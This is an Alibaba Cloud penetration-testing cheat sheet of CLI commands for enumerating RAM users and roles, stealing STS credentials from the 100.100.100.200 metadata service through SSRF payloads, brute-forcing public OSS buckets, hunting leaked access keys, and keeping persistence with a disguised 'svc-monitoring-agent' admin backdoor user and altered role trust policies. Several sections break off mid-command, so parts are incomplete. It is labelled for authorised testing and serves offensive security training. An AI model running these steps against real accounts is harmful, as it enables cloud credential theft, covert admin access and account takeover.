Alibaba Cloud
Security Engagement Cheat Sheet

CLI commands, enumeration workflows, attack paths, and reference for Alibaba Cloud (Aliyun) penetration testing engagements. Covers aliyun CLI, ossutil, RAM/IAM, IMDS, ECS, OSS, RDS, VPC, and privilege escalation.

⚠ Authorized Testing Only aliyun CLI v3.x Aliyun SDK compatible

Setup & Authentication #01
📦 Install aliyun CLI ▼

The primary CLI tool for all Alibaba Cloud API calls. Required for most enumeration tasks.

Linux/macOS (direct) 
wget https://aliyuncli.alicdn.com/aliyun-cli-linux-latest-amd64.tgz
tar xzf aliyun-cli-linux-latest-amd64.tgz
sudo mv aliyun /usr/local/bin/
aliyun --version
macOS (Homebrew) 
brew install aliyun-cli
ossutil (Object Storage CLI) 
# Linux
wget https://gosspublic.alicdn.com/ossutil/latest/ossutil64 -O ossutil
chmod +x ossutil && sudo mv ossutil /usr/local/bin/
🔑 Configure Credentials FIRST STEP ▼

Multiple auth modes. Use AccessKey for long-term creds, EcsRamRole from within an EC2-equivalent instance, RamRoleArn for assumed roles, StsToken for temporary creds.

Interactive setup (AccessKey) 
aliyun configure
# Prompts for: Access Key ID, Access Key Secret, Region ID, Output format
# Config stored in ~/.aliyun/config.json
Non-interactive / scripted 
aliyun configure set \
  --profile myprofile \
  --mode AK \
  --region cn-hangzhou \
  --access-key-id <AKID> \
  --access-key-secret <AKSECRET>
STS Token (temporary credentials — post-IMDS theft) 
aliyun configure set \
  --profile sts-profile \
  --mode StsToken \
  --region cn-hangzhou \
  --access-key-id <TEMP_AKID> \
  --access-key-secret <TEMP_AKSECRET> \
  --sts-token <STS_TOKEN>
RamRoleArn (assume a role) 
aliyun configure set \
  --profile assumed \
  --mode RamRoleArn \
  --region cn-hangzhou \
  --access-key-id <AKID> \
  --access-key-secret <AKSECRET> \
  --ram-role-arn acs:ram::<ACCOUNT_ID>:role/<ROLE_NAME> \
  --role-session-name pentest
EcsRamRole (from inside an ECS instance) 
aliyun configure set \
  --profile ecs-role \
  --mode EcsRamRole \
  --region cn-hangzhou \
  --ram-role-name <ROLE_NAME>
Via environment variables 
export ALIBABA_CLOUD_ACCESS_KEY_ID="AKID..."
export ALIBABA_CLOUD_ACCESS_KEY_SECRET="Secret..."
export ALIBABA_CLOUD_SECURITY_TOKEN="StsToken..."  # if using STS
export ALIBABA_CLOUD_REGION_ID="cn-hangzhou"
List profiles / switch profile 
aliyun configure list             # list all profiles
aliyun configure get              # show current profile config
aliyun --profile myprofile ecs DescribeInstances  # use specific profile

Config file lives at ~/.aliyun/config.json — always check this on compromised hosts for stored credentials.

👤 Verify Identity (Who Am I?) ▼
Get caller identity 
aliyun sts GetCallerIdentity

Returns: AccountId, UserId, Arn, IdentityType (Account/RAMUser/AssumedRoleUser). The ARN format reveals whether you're a root account, RAM user, or assumed role.

ARN formats 
# Root account
acs:ram::<ACCOUNT_ID>:root

# RAM user
acs:ram::<ACCOUNT_ID>:user/<USERNAME>

# Assumed role (STS)
acs:ram::<ACCOUNT_ID>:assumed-role/<ROLE_NAME>/<SESSION>

# Service account (ECS role)
acs:sts::<ACCOUNT_ID>:assumed-role/<ROLE_NAME>/<INSTANCE_ID>

🔍 ScoutSuite (Automated Cloud Audit) ▼

ScoutSuite by NCC Group supports Alibaba Cloud. Runs a comprehensive multi-service audit and produces an HTML report with findings, severity ratings, and evidence.

Install and run ScoutSuite

# Set credentials via env vars first, then:
scout aliyun --report-dir ./scout-report

RAM — Resource Access Management (IAM) #03
RAM vs AWS IAM: RAM (Resource Access Management) is Alibaba Cloud's IAM equivalent. RAM Users = IAM Users. RAM Roles = IAM Roles. RAM Policies = IAM Policies. STS (Security Token Service) provides temporary credentials. The root account is called the "Alibaba Cloud account" or "primary account."
👥 Enumerate Users & Groups HIGH VALUE ▼
List all RAM users 
aliyun ram ListUsers
aliyun ram ListUsers --MaxItems 100
Get specific user details 
aliyun ram GetUser --UserName <USERNAME>
aliyun ram ListAccessKeys --UserName <USERNAME>  # check for access keys
aliyun ram GetLoginProfile --UserName <USERNAME>  # check console login
List groups and memberships 
aliyun ram ListGroups
aliyun ram ListUsersForGroup --GroupName <GROUP>
aliyun ram ListGroupsForUser --UserName <USERNAME>
List virtual MFA devices 
aliyun ram ListVirtualMFADevices

Users without MFA but with console access are high-value targets. Users with AccessKeys AND console login increase attack surface.

📋 Enumerate Policies CRITICAL ▼
List all policies (custom only) 
aliyun ram ListPolicies --PolicyType Custom
aliyun ram ListPolicies --PolicyType System  # Alibaba-managed policies
Get policy document (view permissions) 
aliyun ram GetPolicy \
  --PolicyType Custom \
  --PolicyName <POLICY_NAME>

aliyun ram GetPolicyVersion \
  --PolicyType Custom \
  --PolicyName <POLICY_NAME> \
  --VersionId v1
List policies attached to a user 
aliyun ram ListPoliciesForUser --UserName <USERNAME>
List policies attached to a group 
aliyun ram ListPoliciesForGroup --GroupName <GROUP>
List policies attached to a role 
aliyun ram ListPoliciesForRole --RoleName <ROLE>
Look for overly permissive policies: AdministratorAccess, AliyunRAMFullAccess, AliyunECSFullAccess, or any with Action: "*" or Resource: "*".
🎭 Enumerate Roles CRITICAL ▼
List all roles 
aliyun ram ListRoles
aliyun ram ListRoles --MaxItems 100
Get role details (inspect trust policy) 
aliyun ram GetRole --RoleName <ROLE_NAME>
List entities (users/services) that can assume a role 
# The trust policy is in GetRole output — check "AssumeRolePolicyDocument"
# Look for wildcard principals or overly broad conditions

Roles with trust policy "Principal": {"RAM": "acs:ram::*:root"} or broad cross-account trust are escalation paths.

🔐 STS — Assume a Role ▼

If you have sts:AssumeRole permission (via AliyunSTSAssumeRoleAccess policy), you can assume roles and gain their permissions.

Assume a role and get STS token 
aliyun sts AssumeRole \
  --RoleArn acs:ram::<ACCOUNT_ID>:role/<ROLE_NAME> \
  --RoleSessionName pentest \
  --DurationSeconds 3600
Use the returned STS credentials 
# From the AssumeRole response, extract:
# Credentials.AccessKeyId
# Credentials.AccessKeySecret
# Credentials.SecurityToken
# Credentials.Expiration

# Configure as new profile:
aliyun configure set \
  --profile assumed-role \
  --mode StsToken \
  --region cn-hangzhou \
  --access-key-id <TEMP_AKID> \
  --access-key-secret <TEMP_SECRET> \
  --sts-token <SECURITY_TOKEN>
Assume with inline policy (scope-down or test permissions) 
aliyun sts AssumeRole \
  --RoleArn acs:ram::<ACCOUNT_ID>:role/<ROLE_NAME> \
  --RoleSessionName test \
  --Policy '{"Version":"1","Statement":[{"Effect":"Allow","Action":"ecs:*","Resource":"*"}]}'

List access keys for a user 
aliyun ram ListAccessKeys --UserName <USERNAME>
Common credential locations on compromised hosts 
# CLI config (all profiles stored here)
~/.aliyun/config.json
cat ~/.aliyun/config.json

# Environment variables
env | grep -iE "aliyun|alibaba|alicloud|akid|secret"

IMDS / Metadata Service & SSRF #04
Alibaba Cloud Metadata endpoint: http://100.100.100.200 (NOT 169.254.169.254 like AWS). Only reachable from within an ECS instance.
💉 IMDS — Normal Mode (No Token Required) SSRF TARGET ▼

By default, ECS instances allow token-free metadata access. If an instance has a RAM role attached, STS credentials are exposed via SSRF with a single GET request.

Root metadata index 
curl http://100.100.100.200/latest/meta-data/
Get instance ID and region 
curl http://100.100.100.200/latest/meta-data/instance-id
curl http://100.100.100.200/latest/meta-data/region-id
curl http://100.100.100.200/latest/meta-data/zone-id
List attached RAM role name 
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/
Steal STS credentials (replace ROLE_NAME) 
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/<ROLE_NAME>

# Returns: AccessKeyId, AccessKeySecret, SecurityToken, Expiration, LastUpdated
Extract all in one command 
ROLE=$(curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/)
curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/${ROLE}
Get user-data (often contains secrets/bootstrap scripts) 
curl http://100.100.100.200/latest/user-data
Get network config (private/public IPs) 
curl http://100.100.100.200/latest/meta-data/network/interfaces/macs/
# Get interface MAC, then:
curl http://100.100.100.200/latest/meta-data/network/interfaces/macs/<MAC>/vpc-id
curl http://100.100.100.200/latest/meta-data/network/interfaces/macs/<MAC>/private-ipv4s
curl http://100.100.100.200/latest/meta-data/network/interfaces/macs/<MAC>/public-ipv4s
🔒 IMDS — Security Hardening Mode (Token Required) ▼

When security hardening mode is enabled, a PUT request must be made first to obtain a token. SSRF via GET-only requests cannot bypass this — but redirects-based SSRF may still work.

Get IMDSv2-style token first 
TOKEN=$(curl -s -X PUT \
  "http://100.100.100.200/latest/api/token" \
  -H "X-aliyun-ecs-metadata-token-ttl-seconds: 21600")
echo $TOKEN
Use token in metadata requests 
curl -H "X-aliyun-ecs-metadata-token: $TOKEN" \
  http://100.100.100.200/latest/meta-data/ram/security-credentials/<ROLE>
Check if hardening mode is enforced (403 = enforced) 
curl -v http://100.100.100.200/latest/meta-data/instance-id
# 403 Forbidden → security hardening mode enabled
# 200 OK         → normal (insecure) mode

Even with hardening mode, SSRF via redirect chains may still retrieve the token PUT response if the SSRF follows redirects. Test SSRF that can issue PUT requests (e.g., via XHR with method override).

🎯 SSRF Testing Payloads ▼

When testing an application for SSRF, try these URLs to reach the metadata service:

Direct and encoded SSRF payloads 
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/

# URL-encoded
http%3A%2F%2F100.100.100.200%2Flatest%2Fmeta-data%2F

# Alternative notations
http://100.100.100.200
http://0x64646464/latest/meta-data/         # hex of 100.100.100.100... adjust
http://[::ffff:6464:6464]/latest/meta-data/ # IPv6 mapped

# Via redirect (host you control)
# Set up: curl -L http://your-server.com/redirect → 100.100.100.200/...
After credential theft — use stolen STS token 
# Configure stolen credentials
aliyun configure set --profile stolen --mode StsToken \
  --region <REGION> \
  --access-key-id <STOLEN_AKID> \
  --access-key-secret <STOLEN_AKSECRET> \
  --sts-token <STOLEN_SECURITY_TOKEN>

# Verify
aliyun --profile stolen sts GetCallerIdentity

# Enumerate from stolen context
aliyun --profile stolen ram ListUsers
aliyun --profile stolen oss ls

⚙ Bucket Configuration & ACLs ▼
Check bucket ACL (public access?) 
ossutil stat oss://bucket-name   # shows ACL, region, creation date
# ACL values: private | public-read | public-read-write
Check bucket policy 
ossutil bucket-policy --method get oss://bucket-name
Check CORS configuration 
ossutil cors --method get oss://bucket-name
Check if server-side encryption is enabled 
ossutil bucket-encryption --method get oss://bucket-name
Check logging configuration 
ossutil logging --method get oss://bucket-name

ossutil website --method get oss://bucket-name

Buckets with ACL public-read or public-read-write are world-accessible. Check for sensitive files: .env, *.pem, *.key, database dumps, backup files.

Unauthenticated Enumeration #09
No credentials needed for these techniques. Useful for external recon and pre-engagement scoping against an Alibaba Cloud-hosted target.
🪣 Public OSS Bucket Discovery NO CREDS ▼

OSS bucket names are globally unique. If you know or can guess a bucket name, you can test for public access with no credentials.

Test if a named bucket is public 
# Format: https://<BUCKET>.oss-<REGION>.aliyuncs.com
curl -s -o /dev/null -w "%{http_code}" \
  https://target-bucket.oss-cn-hangzhou.aliyuncs.com
# 200 = public read | 403 = private | 404 = does not exist
List public bucket contents (no auth) 
curl "https://target-bucket.oss-cn-hangzhou.aliyuncs.com?max-keys=1000"
# Returns XML listing if public-read ACL is set
Bucket name bruteforce / permutation wordlist 
# Common naming patterns to try:
# <company>-backup, <company>-data, <company>-assets
# <company>-prod, <company>-dev, <company>-staging
# <company>-logs, <company>-static, <company>-cdn

for bucket in company-backup company-data company-prod company-dev company-logs; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    https://${bucket}.oss-ap-southeast-1.aliyuncs.com)
  echo "$bucket → $code"
done
Regions to try for bucket enumeration 
oss-cn-hangzhou.aliyuncs.com
oss-cn-shanghai.aliyuncs.com
oss-cn-beijing.aliyuncs.com
oss-ap-southeast-1.aliyuncs.com   # Singapore (common for intl)
oss-us-east-1.aliyuncs.com
oss-eu-central-1.aliyuncs.com
Look for high-value files in public buckets 
# Target file types via URL if you know object keys, or parse XML listing:
curl "https://target.oss-cn-hangzhou.aliyuncs.com/.env"
curl "https://target.oss-cn-hangzhou.aliyuncs.com/backup.sql"
curl "https://target.oss-cn-hangzhou.aliyuncs.com/credentials.json"
curl "https://target.oss-cn-hangzhou.aliyuncs.com/config/database.yml"

Public-read-write buckets allow anyone to upload files — check if target buckets accept PUT requests without auth.

🔍 DNS & Subdomain Enumeration ▼

Identify exposed Alibaba Cloud assets by enumerating DNS records and subdomains. Look for CNAME records pointing to Alibaba Cloud endpoints.

Identify Alibaba Cloud hosting via DNS 
# CNAMEs pointing to Alibaba services
dig +short target.com CNAME
# aliyuncs.com = Alibaba Cloud
# alicdn.com = Alibaba CDN
# aliyun.com = Alibaba services
# oss-*.aliyuncs.com = OSS bucket
# slb.aliyuncs.com = Server Load Balancer
Passive recon — find subdomains pointing to Alibaba 
# Use tools like subfinder, amass, or certificate transparency logs:
subfinder -d target.com -silent | while read sub; do
  cname=$(dig +short $sub CNAME)
  ip=$(dig +short $sub A)
  [[ "$cname" == *"aliyun"* ]] && echo "ALICLOUD CNAME: $sub → $cname"
  [[ "$ip" == *".*"* ]] && echo "IP: $sub → $ip"
done

# Check crt.sh for certificate transparency
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u
Subdomain takeover check (Alibaba-specific) 
# If a CNAME points to an unclaimed OSS/SLB endpoint, takeover may be possible
# Fingerprints:
# OSS: "NoSuchBucket" in response body
# SLB: connection refused or 404 with no content

curl -s https://subdomain.target.com | grep -i "NoSuchBucket\|not found"

🔑 Leaked Credential Hunting ▼

Alibaba Cloud AccessKey IDs follow a recognizable pattern — useful for scanning public sources.

AccessKey ID format (for grep/regex) 
# Alibaba Cloud AccessKey IDs always start with "LTAI"
# Format: LTAI[A-Za-z0-9]{16,24}
# Example: LTAI5tBxxxxxxxxxxxxxxxxxxxxx

grep -rE "LTAI[A-Za-z0-9]{16,}" . 2>/dev/null
Search GitHub / code repositories 
# GitHub search queries:
# "LTAI" "aliyuncs.com"
# "access_key_id" "LTAI"
# "AccessKeyId" filename:.env
# "aliyun" filename:config.json

# truffleHog for git history scanning:
trufflehog git https://github.com/target/repo --only-verified
Validate a found AccessKey (does it work?) 
aliyun configure set --profile test --mode AK \
  --region cn-hangzhou \
  --access-key-id <FOUND_AKID> \
  --access-key-secret <FOUND_SECRET>

aliyun --profile test sts GetCallerIdentity

💉 SSRF → Credential Theft Chain CRITICAL PATH ▼

The most common foothold path: find an SSRF in a public-facing app on ECS, reach the metadata endpoint, steal the attached RAM role STS token, use it as a foothold.

Step 1 — Discover SSRF via common parameters 
# Common SSRF parameters to fuzz:
# url=, src=, dest=, redirect=, uri=, path=, fetch=, load=, target=
# callback=, image=, link=, file=, proxy=, resource=, ref=

# Test payloads:
https://target.com/fetch?url=http://100.100.100.200/latest/meta-data/
https://target.com/image?src=http://100.100.100.200/latest/meta-data/instance-id
https://target.com/proxy?dest=http://100.100.100.200/latest/user-data
Step 2 — Extract RAM role name 
https://target.com/fetch?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/
# Response body contains the role name, e.g.: "ecs-prod-role"
Step 3 — Steal STS credentials

# Returns: AccessKeyId, AccessKeySecret, SecurityToken, Expiration

aliyun configure set --profile ssrf-foothold --mode StsToken \

Persistence #13
Persistence mechanisms should only be created if explicitly in scope. Always document and remove all artifacts after the engagement.
👤 Create Backdoor RAM User NOISY ▼
Create a hidden backdoor RAM user with AK 
# Create user (use a benign-looking name)
aliyun ram CreateUser --UserName svc-monitoring-agent

# Create AccessKey for the user
aliyun ram CreateAccessKey --UserName svc-monitoring-agent
# ↑ Save the returned AccessKeyId + AccessKeySecret immediately

# Attach admin policy
aliyun ram AttachPolicyToUser \
  --PolicyType System \
  --PolicyName AdministratorAccess \
  --UserName svc-monitoring-agent
Add backdoor user to an existing admin group (less visible) 
# Find an existing admin group:
aliyun ram ListGroups
aliyun ram ListPoliciesForGroup --GroupName <ADMIN_GROUP>

# Add user to the group instead of direct policy attach:
aliyun ram AddUserToGroup \
  --UserName svc-monitoring-agent \
  --GroupName <ADMIN_GROUP>

Direct AdministratorAccess attachment is flagged as high-risk in the RAM console. Adding to a group blends in better with existing patterns.

🔑 Add AccessKey to Existing User STEALTHY ▼

Each RAM user can have up to 2 AccessKeys. Adding a second key to an existing privileged user avoids creating suspicious new accounts.

Add AK to existing user (requires ram:CreateAccessKey) 
# Find an admin user:
aliyun ram ListUsers
aliyun ram ListPoliciesForUser --UserName <ADMIN_USER>

# Add a new access key to their account:
aliyun ram CreateAccessKey --UserName <ADMIN_USER>
# Returns new AccessKeyId + AccessKeySecret
🎭 Backdoor RAM Role (Trust Policy Modification) ▼

Modify a privileged role's trust policy to allow assumption from an attacker-controlled account or RAM user — persistent even if original credentials are rotated.

Add external account to a role's trust policy

        "Effect": "Allow",

    ]
  }'

  --DurationSeconds 43200
